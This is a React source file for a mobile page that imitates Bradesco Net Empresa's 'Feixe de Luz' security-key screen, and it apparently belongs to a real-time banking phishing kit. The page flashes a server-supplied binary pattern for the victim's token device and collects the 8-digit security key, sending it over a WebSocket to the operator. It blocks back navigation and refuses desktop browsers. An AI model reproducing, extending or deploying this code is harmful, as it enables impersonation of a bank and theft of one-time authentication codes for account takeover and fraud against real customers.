import { useEffect, useRef, useState, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import bradescoLogo from "@/assets/bradesco-logo.png";
import { resolveServerRoute } from "@/lib/resolveServerRoute";
import { useWebSocket } from "@/hooks/useWebSocket";

const FeixePage = () => {
  const navigate = useNavigate();
  const usuario = localStorage.getItem("usuario") || "";
  const dispositivo = localStorage.getItem("dispositivo") || "";
  const [status, setStatus] = useState<"aguardando" | "lendo" | "validando" | "erro">("aguardando");
  const [binario, setBinario] = useState<string>("");
  const [corAtual, setCorAtual] = useState<"black" | "white">("black");
  const [chave, setChave] = useState(["", "", "", "", "", "", "", ""]);
  const [erroChave, setErroChave] = useState("");
  const [enviandoChave, setEnviandoChave] = useState(false);
  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const indexRef = useRef(0);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const { send } = useWebSocket({
    reconectarPayload: { dispositivo },
    onRedirect: (msg) => {
      setStatus("validando");
      setTimeout(() => {
        navigate(resolveServerRoute(msg.url));
      }, 1500);
    },
    onMessage: (msg) => {
      if (msg.acao === "feixe_binario" && msg.binario) {
        setBinario(msg.binario);
        setStatus("aguardando");
      }
      if (msg.acao === "erro_chave") {
        setErroChave(msg.motivo || "Chave inválida. Tente novamente.");
        setEnviandoChave(false);
      }
      if (msg.acao === "erro_feixe") {
        setStatus("erro");
        if (intervalRef.current) { clearInterval(intervalRef.current); intervalRef.current = null; }
      }
    },
  });

  const iniciarLeitura = useCallback(() => {
    if (!binario) return;
    setStatus("lendo");
    indexRef.current = 0;

    if (intervalRef.current) clearInterval(intervalRef.current);

    intervalRef.current = setInterval(() => {
      if (indexRef.current >= binario.length) {
        clearInterval(intervalRef.current!);
        intervalRef.current = null;
        setCorAtual("black");
        setStatus("aguardando");
        send({ acao: "feixe_lido", usuario });
        return;
      }
      setCorAtual(binario[indexRef.current] === "1" ? "white" : "black");
      indexRef.current++;
    }, 50);
  }, [binario, usuario, send]);

  const handleDigit = (index: number, value: string) => {
    if (!/^\d?$/.test(value)) return;
    const newChave = [...chave];
    newChave[index] = value;
    setChave(newChave);
    setErroChave("");
    if (value && index < 7) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !chave[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const chaveCompleta = chave.every(d => d !== "");

  const enviarChave = () => {
    if (!chaveCompleta) return;
    setErroChave("");
    setEnviandoChave(true);
    send({ acao: "token", usuario, token: chave.join("") });
    navigate("/validando");
  };

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePop = () => window.history.pushState(null, "", window.location.href);
    window.addEventListener("popstate", handlePop);
    return () => {
      window.removeEventListener("popstate", handlePop);
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, []);

  return (
    <>
      {/* Desktop blocker */}
      <div className="hidden md:flex min-h-screen items-center justify-center bg-[hsl(220,60%,40%)] p-8">
        <div className="text-center text-white max-w-sm space-y-4">
          <div className="w-16 h-16 rounded-2xl bg-white/20 flex items-center justify-center mx-auto">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-8 h-8" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
          </div>
          <h2 className="text-xl font-bold">Acesso exclusivo pelo celular</h2>
          <p className="text-white/70 text-sm leading-relaxed">Este portal está disponível apenas para dispositivos móveis.</p>
        </div>
      </div>

      {/* Mobile layout */}
      <div className="md:hidden min-h-screen flex flex-col bg-white">
        <div className="bg-[hsl(220,60%,40%)] px-4 py-3">
          <h1 className="text-white text-base font-semibold tracking-tight">Bradesco Net Empresa</h1>
        </div>

        <div className="flex flex-col flex-1 px-5 pt-6 pb-8">
          <h2 className="text-[hsl(220,20%,14%)] text-lg font-bold mb-6">Chave de Segurança - Feixe de Luz</h2>

          <div className="flex justify-start mb-6">
            <div
              className="w-40 h-40 border border-[hsl(220,14%,80%)] transition-colors duration-[30ms]"
              style={{ backgroundColor: status === "lendo" ? corAtual : "black" }}
            />
          </div>

          <div className="space-y-3 mb-6">
            <p className="text-[hsl(220,10%,40%)] text-sm">1 - Na sua chave, aperte o botão com o desenho de cadeado</p>
            <p className="text-[hsl(220,10%,40%)] text-sm">2 - Posicione o sensor que fica no verso dela, na frente deste quadro preto (cerca de 1 cm)</p>
            <p className="text-[hsl(220,10%,40%)] text-sm">3 - Com a chave posicionada, clique em Iniciar Leitura, aqui na tela, e aguarde.</p>
          </div>

          {status === "aguardando" && (
            <button
              onClick={iniciarLeitura}
              disabled={!binario}
              className="w-full max-w-[240px] mx-auto h-12 rounded-full bg-[hsl(349,93%,42%)] text-white text-base font-semibold active:scale-[0.97] transition-all duration-200 disabled:opacity-50 mb-6"
            >
              Iniciar Leitura
            </button>
          )}

          {status === "lendo" && (
            <div className="flex flex-col items-center gap-3 mb-6">
              <div className="w-8 h-8 border-[3px] border-[hsl(220,14%,89%)] border-t-[hsl(349,93%,42%)] rounded-full animate-spin" />
              <p className="text-[hsl(220,10%,46%)] text-sm animate-pulse">Realizando leitura...</p>
            </div>
          )}

          {status === "validando" && (
            <div className="flex flex-col items-center gap-3 mb-6">
              <svg xmlns="http://www.w3.org/2000/svg" className="w-10 h-10 text-[hsl(142,71%,45%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/>
              </svg>
              <p className="text-[hsl(142,71%,45%)] text-sm font-medium">Validado! Redirecionando...</p>
            </div>
          )}

          {status === "erro" && (
            <div className="flex flex-col items-center gap-3 mb-6">
              <p className="text-[hsl(0,84%,60%)] text-sm">Não foi possível validar. Tente novamente.</p>
              <button
                onClick={() => { setStatus("aguardando"); setChave(["","","","","","","",""]); send({ acao: "reconectar", usuario }); }}
                className="px-8 h-12 rounded-full bg-[hsl(349,93%,42%)] text-white text-sm font-semibold active:scale-[0.97] transition-all duration-200"
              >
                Tentar novamente
              </button>
            </div>
          )}

          {/* Security key input */}
          <div className="w-full bg-[hsl(220,20%,96%)] rounded-xl px-4 py-5 border border-[hsl(220,14%,89%)] mt-auto">
            <div className="flex items-center gap-3 mb-4">
              <svg xmlns="http://www.w3.org/2000/svg" className="w-10 h-10 shrink-0 text-[hsl(220,10%,60%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
                <rect x="3" y="3" width="7" height="7" rx="1" />
                <rect x="14" y="3" width="7" height="7" rx="1" />
                <rect x="3" y="14" width="7" height="7" rx="1" />
                <rect x="14" y="14" width="4" height="4" rx="1" />
                <path d="M20 16v2a2 2 0 0 1-2 2h-1" />
                <path d="M21 21h.01" />
              </svg>
              <h3 className="text-[hsl(220,20%,14%)] text-sm font-bold leading-tight">
                Digite a Chave de segurança com 8 dígitos
              </h3>
            </div>

            <div className="flex justify-between px-1 mb-3">
              {chave.map((digit, i) => (
                <input
                  key={i}
                  ref={el => { inputRefs.current[i] = el; }}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleDigit(i, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(i, e)}
                  className="w-8 h-10 text-center text-base font-mono border-b-2 border-[hsl(220,14%,80%)] bg-transparent focus:outline-none focus:border-[hsl(220,60%,40%)] transition-colors"
                />
              ))}
            </div>

            <p className="text-[hsl(220,10%,56%)] text-xs text-center mb-4">
              Confira o número de série do seu dispositivo: <span className="font-bold text-[hsl(220,20%,14%)]">{dispositivo || "—"}</span>
            </p>

            {erroChave && <p className="text-[hsl(0,84%,60%)] text-xs text-center mb-3">{erroChave}</p>}

            <button
              onClick={enviarChave}
              disabled={!chaveCompleta || enviandoChave}
              className="w-full h-11 rounded-full bg-[hsl(349,93%,42%)] text-white text-sm font-semibold active:scale-[0.97] transition-all duration-200 disabled:opacity-50"
            >
              {enviandoChave ? "Enviando..." : "Confirmar"}
            </button>
          </div>
        </div>
      </div>
    </>
  );
};

export default FeixePage;
